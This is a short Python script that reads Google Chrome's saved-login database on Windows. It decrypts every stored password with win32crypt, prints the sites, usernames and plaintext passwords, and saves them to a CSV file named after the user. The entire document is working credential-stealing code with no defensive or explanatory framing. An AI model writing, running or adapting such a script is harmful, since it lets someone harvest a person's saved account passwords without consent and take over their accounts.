import sqlite3
import os 
import pandas as pd
import win32crypt


if not os.path.isdir(os.environ.get('USERNAME')):
    os.makedirs(os.environ.get('USERNAME'))



user_path = os.curdir + '/' + os.environ.get('USERNAME') + '/'

data_path = os.path.expanduser('~') + '/AppData/Local/Google/Chrome/User Data/Default'
login_db = os.path.join(data_path, 'Login Data')

c = sqlite3.connect(login_db)
cursor = c.cursor()
select_statement = "SELECT origin_url, username_value, password_value FROM logins"
cursor.execute(select_statement)
data = cursor.fetchall()
df_pwd = pd.DataFrame(data,columns=['url', 'name','pwd_data'])
password = []
for url , name , pwd in data:
    password.append(win32crypt.CryptUnprotectData(pwd, None, None, None, 0))


df_pwd['passwords'] = password
del df_pwd['pwd_data']
path_save = os.curdir + '/' + os.environ.get('USERNAME') + '/' +'password.csv'
print(df_pwd)
df_pwd.to_csv(path_save)

